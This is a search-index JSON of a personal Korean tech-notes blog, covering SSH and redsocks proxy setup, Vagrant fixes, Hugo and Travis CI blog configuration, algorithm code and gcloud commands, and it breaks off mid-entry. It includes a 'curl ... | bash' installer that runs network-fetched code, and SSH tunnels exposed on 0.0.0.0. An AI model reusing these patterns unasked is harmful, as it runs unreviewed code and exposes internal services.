[
{
	"uri": "https://keyolk.github.io/workspace/",
	"title": "Workspace",
	"tags": [],
	"description": "",
	"content": " Workspace OS, Desktop, Terminal, Editor 등 작업환경 설정 관련 정리.\nContents  fish   proxy   vi   blog   gcloud   personal   prefix   "
},
{
	"uri": "https://keyolk.github.io/architecture/distributed_system/bully/",
	"title": "bully",
	"tags": [],
	"description": "",
	"content": " Bully "
},
{
	"uri": "https://keyolk.github.io/system/linux/criu/",
	"title": "criu",
	"tags": [],
	"description": "",
	"content": " Checkpoint \u0026amp; Restore in Userspace\nUsage $ criu dump -t ${PID} -vvv -o dump.log \u0026amp;\u0026amp; echo OK $ criu restore -d -vvv -o restore.log \u0026amp;\u0026amp; echo OK $ criu dump -vvvv -o dump.log -t ${PID --shell-job \u0026amp;\u0026amp; echo OK $ criu restore -vvvv -o restore.log --shell-job \u0026amp;\u0026amp; echo OK  Details  ptrace mmap parasite code injection TCP repair mode  Dump  Stop the tasks  Freez by PTRACE_SEIZE or cgroup freezer Lock network  Collect process information  proc files parasite injection Credential, memory contents, signals  Dump pages  memory pages copied via vmsplice and splice syscalls   Restore  tree  Issues  External Resources  Unix socket TCP Shell Jobs File locks Bind mounts  Device Accesses  /dev/null, /dev/net/tun X applications  ETC  File System SysV IPC Nested namespace or cgroup   Reference  https://media.ccc.de/v/896-exploring-criu  "
},
{
	"uri": "https://keyolk.github.io/architecture/database/",
	"title": "database",
	"tags": [],
	"description": "",
	"content": " Database  RDB NOSQL  "
},
{
	"uri": "https://keyolk.github.io/algorithm/datastructure/",
	"title": "datastructure",
	"tags": [],
	"description": "",
	"content": " Intro  Stack, Queue, Deque Priority Queue, Heap Binary Tree Segment Tree Fenwik Tree TRIE Union Find Balanced Tree  B, B+, B* Red Black AVL Splay Treap  Graph  Adjacency Array Adjacency List Edge List   "
},
{
	"uri": "https://keyolk.github.io/workspace/fish/",
	"title": "fish",
	"tags": [],
	"description": "",
	"content": " slow startup 보통 set -x를 잘못써서 특정 global variable의 길이가 너무 길어지는게 문제가 된다.\n\u0026ldquo;fish_user_paths\u0026rdquo; 길이를 체크해볼 필요가 있다.\n$ set -U # 확인 후 $ set -e fish_user_paths # 필요 시 삭제  "
},
{
	"uri": "https://keyolk.github.io/architecture/distributed_system/gossip/",
	"title": "gossip",
	"tags": [],
	"description": "",
	"content": " Gossip "
},
{
	"uri": "https://keyolk.github.io/architecture/monitoring/",
	"title": "monitoring",
	"tags": [],
	"description": "",
	"content": " Push vs Pull  Target discovery Who initiates metric transfer  Reference http://www.boxever.com/push-vs-pull-for-monitoring/\n"
},
{
	"uri": "https://keyolk.github.io/architecture/distributed_system/paxos/",
	"title": "paxos",
	"tags": [],
	"description": "",
	"content": " Paxos "
},
{
	"uri": "https://keyolk.github.io/workspace/proxy/",
	"title": "proxy",
	"tags": [],
	"description": "",
	"content": " Intro 사무실용 환경 설정에 필요한 Step 정리.\n Corporation Firewall에 따른 개인용 Transparent Proxy. 이종 OS간 Keyboard/Mouse Sharing. 내부 가상화 환경. SSH.  OpenSSH Remote Host Configuration File을 통해 Remote Host를 관리하면 편하다.\n$ cat ~/.ssh/config  Host remote1 Hostname 1.2.3.4 User root IdentityFile remote1 ForwardX11 yes ProxyCommand ssh proxy nc %h %p  위의 예는 SSH를 연결하면서 X11Forward와 Dynamic Proxy 연결을 같이 한다.\nIdentityFile을 별도로 만들경우 아래와 같이 사용 가능하다.\n$ ssh -i $IDENTITY_FILE $REMOTE  Proxy Forward Proxy $ ssh -N -f -L 0.0.0.0:8080:1.2.3.4:8080 $REMOTE  Backward Proxy $ ssh -R 0.0.0.0:8080:1.2.3.4:8080 $REMOTE  0.0.0.0에 port를 binding 하려면 아래 설정이 필요하다.\n$ cat /etc/ssh/sshd_config | grep -i gatewayports GatewayPorts yes  Dynamic Proxy $ ssh -D 8080 $REMOTE  X11 Forward $ ssh -X $REMOTE  XAuth를 Skip한다.\n$ ssh -Y $REMOTE  관련 설정\n$ cat /etc/ssh/sshd_config | grep -i x11 X11Forwarding yes #X11DisplayOffset 10 X11UseLocalHost yes  Redosocks Corporation Firewall로 인해 internet으로 가는 pakcet은 모두 Proxy를 거쳐가야한다. HTTP proxy를 일일이 등록하는건 힘드므로, 개인용 Transparent Proxy를 구축한다.\n# pacman -Sy redsocks  # vi /etc/redsocks.conf  base { log_debug = off; log_info = on; log = stderr; daemon = on; redirector = iptables; } redsocks { local_ip = 0.0.0.0; local_port = 10080; ip = proxy; port = 8080; type = http-relay; } redsocks { local_ip = 0.0.0.0; local_port = 10443; ip = proxy; port = 8080; type = http-connect; }  # systemctl enable redsocks # systemctl start redsocks  위와 같이 구성하면 redsocks는 10080/10443으로 오는 packet을 SOCKS channel을 통해 모두 proxy:8080으로 보내게된다.\n#!/bin/bash iptables -t nat -N PROXY iptables -t nat -F PROXY iptables -t nat -I OUTPUT 1 -j PROXY iptables -t nat -I PREROUTING 1 -j PROXY for network in `ip a | grep 'inet ' | grep -v 'inet6' | awk '{print $2}'`; do sudo iptables -t nat -A PROXY -j RETURN --dest $network -p tcp done iptables -t nat -A PROXY -p tcp --dport 80 -j REDIRECT --to 10080 iptables -t nat -A PROXY -p tcp --dport 443 -j REDIRECT --to 10443  위와 같이하면 내부 network을 제외, 외부로 나가는 모든 HTTP/HTTPS packet은 각기 10080/10443을 통해 proxy로 가게된다.\nProxy Auto Config 내부 System과 외부 System이 혼재되어 있을때 이를 모두 iptable를 통해 proxy 처리하려면 힘들다. 간단한 작업은 PAC를 통해할 수 있다. 또한 특정 target과 연동되어있는 System의 경우 Dynamic Proxy를 통해 VPN과같은 효과를 사용해야한다.\n아래 10000 port는 target system에 대해 VPN endpoint가 된다.\nssh -N -f -D :10000 target  아래와 같이 URI/IP에 따라 경유되는 channel을 바꿔줄 수 있다.\nGATEWAY_TARGET=\u0026quot;SOCKS localhost:10000; DIRECT\u0026quot;; GATEWAY_PROXY=\u0026quot;proxy:8080;\u0026quot; function FindProxyForURL(url, host) { if(host==\u0026quot;127.0.0.1\u0026quot; || host==\u0026quot;localhost\u0026quot;) return \u0026quot;DIRECT\u0026quot;; if(host==\u0026quot;1.2.3.4\u0026quot;) return GATEWAY_TARGET; if(host==\u0026quot;example-1.org\u0026quot; || dnsDomainIs(host, \u0026quot;.example-1.org\u0026quot;)) return GATEWAY_TARGET; if(host==\u0026quot;5.6.7.8\u0026quot;) return GATEWAY_PROXY; if(host==\u0026quot;example-2.org\u0026quot; || dnsDomainIs(host, \u0026quot;.example-2.org\u0026quot;)) return GATEWAY_PROXY; return GATEWAY_PROXY; }  위 pac를 Browser나 NetworkManager의 Proxy설정에 반영하면 HTTP/HTTPS packetㅇ네 대해서 위에 정의한대로 Routing 시켜준다.\nVagrant Plugin 내 경우 보통 아래 plugin들을 사용한다.\n$ vagrant plugin install landrush vagrant-cachier vagrant-triggers vagrant-vbguest vagrant-proxyconf vagrant-ca-certificates  landrush는 vagrant instance들과 host machine 사이에 DNS를 구축하는걸 도와준다.\n구체적으론 resolveconf와 dnsmasq를 이용한 구성이다. Arch 등 일부 OS에서는 자동으로 dnsmasq 설치와 설정을 처리해주지 않으므로, 직접 구성해줘야 한다.\nopenresolv 경우,\n# vi /etc/resolv.conf.head  nameserver 127.0.0.1  # resolveconf -u  위와 같이 persist한 DNS 설정을 추가할 수 있다.\ndnsmasq는,\n# vi /etc/dnsmasq.conf  위 설정에 아래 line을 추가하면 .vagrant의 TLD를 + 10053 port에서 service하는 landrush에 물어보도록 할 수 있다.\nserver=/.vagrant/127.0.0.1#10053  Trouble Shooting Failed to open a session for the virtual machine seconion-standalone. Implementation of the USB 2.0 controller not found! Because the USB 2.0 controller state is part of the saved VM state, the VM cannot be started. To fix this problem, either install the 'Oracle VM VirtualBox Extension Pack' or disable USB 2.0 support in the VM settings (VERR_NOT_FOUND). Result Code: NS_ERROR_FAILURE (0x80004005) Component: Console Interface: IConsole {8ab7c520-2442-4b66-8d74-4ff1e195d2b6}  config.vm.provider \u0026quot;virtualbox\u0026quot; do |vb| vb.customize [\u0026quot;modifyvm\u0026quot;, :id, \u0026quot;--usb\u0026quot;, \u0026quot;on\u0026quot;] vb.customize [\u0026quot;modifyvm\u0026quot;, :id, \u0026quot;--usbehci\u0026quot;, \u0026quot;off\u0026quot;] end  No usable default provider could be found for your system. Vagrant relies on interactions with 3rd party systems, known as \u0026quot;providers\u0026quot;, to provide Vagrant with resources to run development environments. Examples are VirtualBox, VMware, Hyper-V. The easiest solution to this message is to install VirtualBox, which is available for free on all major platforms. If you believe you already have a provider available, make sure it is properly installed and configured. You can see more details about why a particular provider isn't working by forcing usage with `vagrant up --provider=PROVIDER`, which should give you a more specific error message for that particular provider.  여러가지 이유가 있겠지만 지원하지 않는 version의 driver만 설치되어 있을 경우에도 발생할 수 있다. driver의 version을 낮추거나 vagrant의 version을 높여도 되지만. 다소 naive한 해결 방법이 존재한다.\n$ cd /opt/vagrant/embedded/gems/gems/vagrant-1.8.4/plugins/providers/virtualbox/driver/ $ ls base.rb version_4_0.rb version_4_2.rb version_5_0.rb meta.rb version_4_1.rb version_4_3.rb $ cp version_5_0.rb version_5_1.rb $ cat version_5_1.rb| grep 5_0 class Version_5_0 \u0026lt; Base @logger = Log4r::Logger.new(\u0026quot;vagrant::provider::virtualbox_5_0\u0026quot;) $ cat meta.rb| grep -A 7 'driver_map ' driver_map = { \u0026quot;4.0\u0026quot; =\u0026gt; Version_4_0, \u0026quot;4.1\u0026quot; =\u0026gt; Version_4_1, \u0026quot;4.2\u0026quot; =\u0026gt; Version_4_2, \u0026quot;4.3\u0026quot; =\u0026gt; Version_4_3, \u0026quot;5.0\u0026quot; =\u0026gt; Version_5_0, } $ cat ../plugin.rb| grep -A 8 'module Driver' module Driver autoload :Meta, File.expand_path(\u0026quot;../driver/meta\u0026quot;, __FILE__) autoload :Version_4_0, File.expand_path(\u0026quot;../driver/version_4_0\u0026quot;, __FILE__) autoload :Version_4_1, File.expand_path(\u0026quot;../driver/version_4_1\u0026quot;, __FILE__) autoload :Version_4_2, File.expand_path(\u0026quot;../driver/version_4_2\u0026quot;, __FILE__) autoload :Version_4_3, File.expand_path(\u0026quot;../driver/version_4_3\u0026quot;, __FILE__) autoload :Version_5_0, File.expand_path(\u0026quot;../driver/version_5_0\u0026quot;, __FILE__) end  위에서 보듯이 3개 file을 수정해주면 정상적으로 실행 가능하다.\nSynergy 이런저런 이유로 Windows와 Linux Machine을 같이 써야한다. Synergy를 사용하여 이종 OS간 Keyboard 및 Mouse, Clipboard를 공유할 수 있다.\n아래 URI에서 가입 및 구매가 필요하다.\nhttps://symless.com/synergy/\nConfiguration # pacman -Sy synergy  기본 Monitor 배치 구성을 먼저 한다.\n$ vi /etc/synergy.conf  section: screens keyolk-arch: keyolk-windows: end section: links keyolk-arch: right = keyolk-windows keyolk-windows: left = keyolk-arch end  Synergy는 Client/Server 구조를 이뤄져있다. 실제 Keyboard와 Mouse가 연결되어 있는 쪽이 Server가 된다.\nServer 구동.\n$ systemctl enable synergys $ systemctl start synergys  Client에서 synergy를 설치 후 Server로 접속하면 된다.\nChrome HSTS Private Network에서 Corporation Certificate를 사용하는 경우 HSTS로 인해 정상적으로 Browsing을 못할 수 있다. Chrome의 경우 borwser에서 해당 domain의 HSTS 정보를 삭제해야한다.\nchrome://net-internals/#hsts  "
},
{
	"uri": "https://keyolk.github.io/architecture/distributed_system/raft/",
	"title": "raft",
	"tags": [],
	"description": "",
	"content": " Raft Available Status  Follower Candidate Leader  Process  Leader Election  Voting Randomized Timeouts  Log Replication  Election Timeout - folower -\u0026gt; candidate\nHeartbeat Timeout\nReference  http://thesecretlivesofdata.com/raft/ https://ramcloud.stanford.edu/wiki/download/attachments/11370504/raft.pdf https://raft.github.io/  "
},
{
	"uri": "https://keyolk.github.io/system/storage/raid/",
	"title": "raid",
	"tags": [],
	"description": "",
	"content": " RAID Redundat Array of Inexpensive Disk\nHardware RAID \u0026amp; Software RAID Striping \u0026amp; Mirroring Striping: 논리적으로 연속된 data segment를 물리적으로 여러개의 디스크에 RR 방식으로 나눠 저장.\nMirroring: Data Replicatin\nArchitecture RAID 0 Striped disk array without fault tolerance\nRAID 1 Mirrroing and duplexing\nRAID 2 Hamming code ECC\nRAID 3 Parallel transfer with parity\n하나의 디스크를 Parity 용으로 사용\nRAID 4 Independent data disk with shared parity disk\n하나의 디스크를 Parity 용으로 사용하 되, 블락 단위로 분산 저장.\nRAID 5 Independent data disk with distributed parity blocks\n3개 이상의 디스크를 붙여서 하나의 디스크로 사용하고 각각에서 parity를 저장.\n1개의 디스크 에러는 다른 2개의 디스크를 통해 복구 됨.\nRAID 6 Parity를 2개씩 사용, 2개의 디스크 에러도 복구 될 수 있음.\nRAID 0+1 RAID 1+0 Reference  http://blog.acronym.co.kr/487    Related files   raid0.png  (21 ko)   raid01.png  (225 ko)   raid1.png  (17 ko)   raid10.png  (13 ko)   raid2.png  (56 ko)   raid3.png  (44 ko)   raid4.png  (394 ko)   raid5.png  (22 ko)   raid6.png  (20 ko)      "
},
{
	"uri": "https://keyolk.github.io/architecture/database/rdb/",
	"title": "rdb",
	"tags": [],
	"description": "",
	"content": " Relational Database\nACID  Atomicity Consistency Isolation Durability  Normalization  1NF: atomic value 2NF 3NF BCNF  Join Logical Join  innter join outer join cross join  Physical Join  Nested Loop Join Sort Merge Join Hash Match Join  Index "
},
{
	"uri": "https://keyolk.github.io/workspace/vi/",
	"title": "vi",
	"tags": [],
	"description": "",
	"content": "  filetype syntax omnifunc  https://medium.com/@schtoeffel/you-don-t-need-more-than-one-cursor-in-vim-2c44117d51db\nmulti cursor : / cgn .\neasy align : ga\nsurround : cs ds ysiw yss\nSlow startup time profile 해보자\n$ vim ${FILE_TO_OPEN} --startuptime profile  "
},
{
	"uri": "https://keyolk.github.io/architecture/distributed_system/zab/",
	"title": "zab",
	"tags": [],
	"description": "",
	"content": " Zap "
},
{
	"uri": "https://keyolk.github.io/algorithm/",
	"title": "Algorithm",
	"tags": [],
	"description": "",
	"content": " Algorithm Datastructure; Algorithm Pattern; Mathematics; 주요 Algorithm; 관련 문제 및 풀이 정리.\nContentes  datastructure   algorithm pattern   gc   sorting   network   computational geometry   string matching   mathematics   etc   "
},
{
	"uri": "https://keyolk.github.io/algorithm/algorithm_pattern/",
	"title": "algorithm pattern",
	"tags": [],
	"description": "",
	"content": " Intro  Backtracking Dynamic Programing Divide and Conquer Greedy Method  "
},
{
	"uri": "https://keyolk.github.io/workspace/blog/",
	"title": "blog",
	"tags": [],
	"description": "",
	"content": " Intro Blogging 환경 구성을 위한 정리.\n Hosting: GitHub Pages Site Generator: Hugo Theme: Learn Commenting: Disqus Analytics: Google Analytics Editor: Prose.io CI: Travis CI Google Adsence  GitHub Pages GitHub Pages을 통해 GitHub에 static site대한 hosting을 받을 수 있다.\nUser Page를 만드려면 간단히 \u0026ldquo;${USER_NAME}.github.io\u0026rdquo;로 repository를 만들고 여기에 static web resource를 담으면 된다.\nHugo Jekyll을 많이 쓰는데 Hugo가 redering 속도가 빠르고 보다 간편한것 같다.\nInstall arch에선 User Repository형태로 제공된다.\n$ yaourt -Sy hugo  Generate Static Web Pages 새로 site를 만들때 file layout을 만들어준다.\n$ hugo new site ${SITE_NAME} $ ls ${SITE_NAME} archetypes content data layouts static themes config.toml  Learn Learn이 깔끔하게 쓰기 좋아보여 사용한다.\nconfig.toml\ntheme = \u0026quot;hugo-theme-learn\u0026quot;  Disqus Disqus를 통해 static site에 comment 기능을 넣을 수 있다.\nconfig.toml\ndisqusShortname = \u0026quot;${DISQUS_SHORT_NAME}\u0026quot;  layouts/partials/disqus.html\n\u0026lt;div id=\u0026quot;disqus_thread\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; (function() { // Don't ever inject Disqus on localhost--it creates unwanted // discussions from 'localhost:1313' on your Disqus account... if (window.location.hostname == \u0026quot;localhost\u0026quot;) return; var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; var disqus_shortname = '{{ .Site.DisqusShortname }}'; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); \u0026lt;/script\u0026gt; \u0026lt;noscript\u0026gt;Please enable JavaScript to view the \u0026lt;a href=\u0026quot;http://disqus.com/?ref_noscript\u0026quot;\u0026gt;comments powered by Disqus.\u0026lt;/a\u0026gt;\u0026lt;/noscript\u0026gt; \u0026lt;a href=\u0026quot;http://disqus.com/\u0026quot; class=\u0026quot;dsq-brlink\u0026quot;\u0026gt;comments powered by \u0026lt;span class=\u0026quot;logo-disqus\u0026quot;\u0026gt;Disqus\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt;  위에서 생성한 partial을 single page에서 참조하도록 해준다. _layouts/default/single.html\n... {{ partial \u0026quot;disqus.html\u0026quot; . }} ...  Google Analytics Google Analytics를 통해 Site 유입 추이 등을 확인할 수 있다.\nconfig.toml\n... googleAnalytics = \u0026quot;${GOOGLE_ANALYTICS}\u0026quot; ...  hugo에서 internal templates을 지원하는 경우 이를 사용하는게 편하다.\n_layouts/default/single.html\n... {{ partial \u0026quot;_internal/google_analytics_async.html\u0026quot; . }} ...  Prose.io Prose.io를 통해 markdown editor를 붙여줄 수 있다. github url을 직접 써도 괜찮지만, 조금 더 나은 작성 환경을 제공 해줄 수 있다.\nconfig.toml\n... [params] editURL = \u0026quot;http://prose.io/#keyolk/keyolk.github.io/edit/hugo/content/\u0026quot; ...  위 경로는 아래와 같이 page header로 들어가게 된다.\n$ grep -nri editurl themes/hugo-theme-learn/layouts/partials/ layouts/partials/header.html:46: {{ if and (or .IsPage .IsSection) .Site.Params.editURL }} layouts/partials/header.html:51: \u0026lt;a class=\u0026quot;github-link\u0026quot; href=\u0026quot;{{ $Site.Params.editURL }}{{ replace $File.Dir \u0026quot;\\\\\u0026quot; \u0026quot;/\u0026quot; }}{{ $File.LogicalName }}\u0026quot; target=\u0026quot;blank\u0026quot;\u0026gt;  Travis CI Jekyll과는 달리 Hugo는 GitHub Pages에서 직접 site generation을 지원해주지 않는다. Travis CI를 통해 commit이 등록될때 마다 site를 생성, 배포되게 할 수 있다.\n.travis.yml\nlanguage: go go: - \u0026quot;1.8.3\u0026quot; env: global: - GIT_NAME=\u0026quot;Chanhun Jeong\u0026quot; - GIT_EMAIL=\u0026quot;keyolk@gmail.com\u0026quot; - SOURCE_DIR=\u0026quot;public\u0026quot; - BUILD_BRANCH=\u0026quot;hugo\u0026quot; - DEPLOY_BRANCH=\u0026quot;master\u0026quot; install: - wget https://github.com/gohugoio/hugo/releases/download/v0.43/hugo_0.43_Linux-64bit.deb - sudo dpkg -i hugo*.deb script: - hugo deploy: - provider: pages github_token: ${GITHUB_TOKEN} local_dir: public skip_cleanup: true target_branch: master on: branch: hugo  Google Adsense 광고를 붙이고자할땐 Google Adsence가 제일 편하다.\n사용하고 있는 Learn Theme엔 custom-header를 정의할 수 있는데,\n관련 guide를 참고해서 script가 single page에 들어 갈 수 있게 만들어준다.\n$ find themes/ | grep custom-header themes/hugo-theme-learn/layouts/partials/custom-header.html  layouts/partials/cutom-header.html\n\u0026lt;script async src=\u0026quot;//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; (adsbygoogle = window.adsbygoogle || []).push({ google_ad_client: \u0026quot;ca-pub-5222442308579087\u0026quot;, enable_page_level_ads: true }); \u0026lt;/script\u0026gt;  Lunr.js 검색 기능을 제공하려 할때 사용할 수 있다.\n사용하고 있는 Learn Theme에서 기본적으로 포함되어 있지만. 한국어 indexing을 지원하지 않는다.\n아래에서 forking된 lunr.js를 사용하면 한글도 indexing 되어 검색할 수 있다. https://github.com/codepiano/lunr.js\ntheme의 lunr.js를 안쓰도록 아래와 같이 theme 내 해당 script의 경로를 찾아서\n$ find ./themes | grep lunr ./themes/hugo-theme-learn/static/js/lunr.min.js  같은 경로에 수정된 lunr.js를 둔다.\n$ mkdir -p ./static/js $ wget https://raw.githubusercontent.com/codepiano/lunr.js/master/lunr.min.js ./static/js/  "
},
{
	"uri": "https://keyolk.github.io/algorithm/gc/",
	"title": "gc",
	"tags": [],
	"description": "",
	"content": " Referenche Counting 순환 참조 시 문제가 됨.\nMark and Sweep root set을 두고 reference의 관계를 추적하면서 garbage를 수집.\nbitmap table이나 root object의 header에 reference에 대한 mark를 남김. 이를 통해 garbage 여부를 판단.\nMemory 파편화 위험이 있음.\nMark and Compaction 파편화를 막기 위해 Compaction을 사용.\nCopying Heap을 Active/InActive로 나눠서 다룸.\nGenerational Copying에서 더 나아가 보다 다양한 방식으로 sub heap을 나눠서 사용함. 각각 sub heap 마다 별개의 GC 방식 적용이 가능함.\nTrain/Incremental Heap을 Block으로 나눠서 다룸.\nAdaptive "
},
{
	"uri": "https://keyolk.github.io/system/container/network/",
	"title": "network",
	"tags": [],
	"description": "",
	"content": " Contaienr Network Model 참고하기 좋다.\n http://murat1985.github.io/kubernetes/cni/2016/05/14/netns-and-cni.html http://murat1985.github.io/kubernetes/cni/2016/05/15/bagpipe-gobgp.html http://murat1985.github.io/kubernetes/cni/2016/05/15/kubernetes.html http://murat1985.github.io/kubernetes/cni/consul/2016/05/26/cni-consul.html http://murat1985.github.io/kubernetes/cni/consul/2016/07/14/cni-consul-impl.html  "
},
{
	"uri": "https://keyolk.github.io/architecture/database/nosql/",
	"title": "nosql",
	"tags": [],
	"description": "",
	"content": " NoSQL CAP  Consistency Availability Partition tolerance  각각 조합에 대한 예:  AP: Dynamo, Cassandra, SimpleDB, CouchDB CA: Aster Data, Greenplum CP: BigTable, Hbase, MongoDB, Redis, MemcacheDB  BASE  Basically Available Soft-state Eventually consistency  PACELC  if there is a partition (P) how does the system tradeoff between availability and consistency (A and C); else (E) when the system is running as normal in the absence of partitions, how does the system tradeoff between latency (L) and consistency \u0026copy;?\n  Hbase : PC/EC Cassandra : PA/EL  Data Model  relational key-value column-oriented/tabular document-oriented  Data Type  scalar: number, string, etc multi-valued: sets  "
},
{
	"uri": "https://keyolk.github.io/architecture/",
	"title": "Architecture",
	"tags": [],
	"description": "",
	"content": " Architecture Cloud, Container, Serverless 등 Architecture 관련 내용 정리.\nContents  database   monitoring   distributed system   msa   serverless   "
},
{
	"uri": "https://keyolk.github.io/system/container/security/",
	"title": "security",
	"tags": [],
	"description": "",
	"content": " Compliance Docker 경우 아래와같이 CIS에서 정리한게 있다.\n 1.6 1.11 1.12  간단한 script를 docker에서 제공한다.\nVulnerability  Twistlock: https://twistlock.com/ Aqua: https://www.aquasec.com/ Nautilus: https://blog.docker.com/tag/nautilus/ CoreOS Clair: https://github.com/coreos/clair OpenSCAP: https://github.com/OpenSCAP/container-compliance Lynis: https://cisofy.com/lynis/plugins/docker-containers/ Vuls: https://github.com/future-architect/vuls/  Content Trust  Docker Notary: https://github.com/docker/notary  Secret  HashiCorp Vault Square Keywhiz  "
},
{
	"uri": "https://keyolk.github.io/algorithm/sorting/",
	"title": "sorting",
	"tags": [],
	"description": "",
	"content": " Intro  Selection Bubble Merge Quick Heap  Merge /* C program for Merge Sort */ #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; // Merges two subarrays of arr[]. // First subarray is arr[l..m] // Second subarray is arr[m+1..r] void merge(int arr[], int l, int m, int r) { int i, j, k; int n1 = m - l + 1; int n2 = r - m; /* create temp arrays */ int L[n1], R[n2]; /* Copy data to temp arrays L[] and R[] */ for (i = 0; i \u0026lt; n1; i++) L[i] = arr[l + i]; for (j = 0; j \u0026lt; n2; j++) R[j] = arr[m + 1+ j]; /* Merge the temp arrays back into arr[l..r]*/ i = 0; // Initial index of first subarray j = 0; // Initial index of second subarray k = l; // Initial index of merged subarray while (i \u0026lt; n1 \u0026amp;\u0026amp; j \u0026lt; n2) { if (L[i] \u0026lt;= R[j]) { arr[k] = L[i]; i++; } else { arr[k] = R[j]; j++; } k++; } /* Copy the remaining elements of L[], if there are any */ while (i \u0026lt; n1) { arr[k] = L[i]; i++; k++; } /* Copy the remaining elements of R[], if there are any */ while (j \u0026lt; n2) { arr[k] = R[j]; j++; k++; } } /* l is for left index and r is right index of the sub-array of arr to be sorted */ void mergeSort(int arr[], int l, int r) { if (l \u0026lt; r) { // Same as (l+r)/2, but avoids overflow for // large l and h int m = l+(r-l)/2; // Sort first and second halves mergeSort(arr, l, m); mergeSort(arr, m+1, r); merge(arr, l, m, r); } } /* UTILITY FUNCTIONS */ /* Function to print an array */ void printArray(int A[], int size) { int i; for (i=0; i \u0026lt; size; i++) printf(\u0026quot;%d \u0026quot;, A[i]); printf(\u0026quot;\\n\u0026quot;); } /* Driver program to test above functions */ int main() { int arr[] = {12, 11, 13, 5, 6, 7}; int arr_size = sizeof(arr)/sizeof(arr[0]); printf(\u0026quot;Given array is \\n\u0026quot;); printArray(arr, arr_size); mergeSort(arr, 0, arr_size - 1); printf(\u0026quot;\\nSorted array is \\n\u0026quot;); printArray(arr, arr_size); return 0; }  "
},
{
	"uri": "https://keyolk.github.io/system/",
	"title": "System",
	"tags": [],
	"description": "",
	"content": " System Operating System 및 Cloud/Container System 등 정리.\nContents  Storage   Virtual Miachine   Container   linux   deadlock   thread   "
},
{
	"uri": "https://keyolk.github.io/algorithm/datastructure/balanced_tree/",
	"title": "balanced tree",
	"tags": [],
	"description": "",
	"content": " Splay  Splay ZigZig ZigZag Rotate  // The code is adopted from http://goo.gl/SDH9hH #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; // An AVL tree node struct node { int key; struct node *left, *right; }; /* Helper function that allocates a new node with the given key and NULL left and right pointers. */ struct node* newNode(int key) { struct node* node = (struct node*)malloc(sizeof(struct node)); node-\u0026gt;key = key; node-\u0026gt;left = node-\u0026gt;right = NULL; return (node); } // A utility function to right rotate subtree rooted with y // See the diagram given above. struct node *rightRotate(struct node *x) { struct node *y = x-\u0026gt;left; x-\u0026gt;left = y-\u0026gt;right; y-\u0026gt;right = x; return y; } // A utility function to left rotate subtree rooted with x // See the diagram given above. struct node *leftRotate(struct node *x) { struct node *y = x-\u0026gt;right; x-\u0026gt;right = y-\u0026gt;left; y-\u0026gt;left = x; return y; } // This function brings the key at root if key is present in tree. // If key is not present, then it brings the last accessed item at // root. This function modifies the tree and returns the new root struct node *splay(struct node *root, int key) { // Base cases: root is NULL or key is present at root if (root == NULL || root-\u0026gt;key == key) return root; // Key lies in left subtree if (root-\u0026gt;key \u0026gt; key) { // Key is not in tree, we are done if (root-\u0026gt;left == NULL) return root; // Zig-Zig (Left Left) if (root-\u0026gt;left-\u0026gt;key \u0026gt; key) { // First recursively bring the key as root of left-left root-\u0026gt;left-\u0026gt;left = splay(root-\u0026gt;left-\u0026gt;left, key); // Do first rotation for root, second rotation is done after else root = rightRotate(root); } else if (root-\u0026gt;left-\u0026gt;key \u0026lt; key) // Zig-Zag (Left Right) { // First recursively bring the key as root of left-right root-\u0026gt;left-\u0026gt;right = splay(root-\u0026gt;left-\u0026gt;right, key); // Do first rotation for root-\u0026gt;left if (root-\u0026gt;left-\u0026gt;right != NULL) root-\u0026gt;left = leftRotate(root-\u0026gt;left); } // Do second rotation for root return (root-\u0026gt;left == NULL)? root: rightRotate(root); } else // Key lies in right subtree { // Key is not in tree, we are done if (root-\u0026gt;right == NULL) return root; // Zag-Zig (Right Left) if (root-\u0026gt;right-\u0026gt;key \u0026gt; key) { // Bring the key as root of right-left root-\u0026gt;right-\u0026gt;left = splay(root-\u0026gt;right-\u0026gt;left, key); // Do first rotation for root-\u0026gt;right if (root-\u0026gt;right-\u0026gt;left != NULL) root-\u0026gt;right = rightRotate(root-\u0026gt;right); } else if (root-\u0026gt;right-\u0026gt;key \u0026lt; key)// Zag-Zag (Right Right) { // Bring the key as root of right-right and do first rotation root-\u0026gt;right-\u0026gt;right = splay(root-\u0026gt;right-\u0026gt;right, key); root = leftRotate(root); } // Do second rotation for root return (root-\u0026gt;right == NULL)? root: leftRotate(root); } } // The search function for Splay tree. Note that this function // returns the new root of Splay Tree. If key is present in tree // then, it is moved to root. struct node *search(struct node *root, int key) { return splay(root, key); } // A utility function to print preorder traversal of the tree. // The function also prints height of every node void preOrder(struct node *root) { if (root != NULL) { printf(\u0026quot;%d \u0026quot;, root-\u0026gt;key); preOrder(root-\u0026gt;left); preOrder(root-\u0026gt;right); } } /* Drier program to test above function*/ int main() { struct node *root = newNode(100); root-\u0026gt;left = newNode(50); root-\u0026gt;right = newNode(200); root-\u0026gt;left-\u0026gt;left = newNode(40); root-\u0026gt;left-\u0026gt;left-\u0026gt;left = newNode(30); root-\u0026gt;left-\u0026gt;left-\u0026gt;left-\u0026gt;left = newNode(20); root = search(root, 20); printf(\u0026quot;Preorder traversal of the modified Splay tree is \\n\u0026quot;); preOrder(root); return 0; }  "
},
{
	"uri": "https://keyolk.github.io/workspace/gcloud/",
	"title": "gcloud",
	"tags": [],
	"description": "",
	"content": " Intro $ curl https://sdk.cloud.google.com | bash  exec -l $SHELL  $ gcloud auth login  GKE $ gcloud components update kubectl  $ gcloud config set project keyolk $ glcoud config set compute/zone asia-east1-a  $ gcloud config set container/cluster keyolk  $ gcloud config list  $ gcloud container clusters create keyolk --num-nodes 2 --machine-type g1-small  $ gcloud compute instances list  $ kubectl run tomcat --image=tomcat  $ gcloud container clusters delete keyolk  "
},
{
	"uri": "https://keyolk.github.io/algorithm/datastructure/heap/",
	"title": "heap",
	"tags": [],
	"description": "",
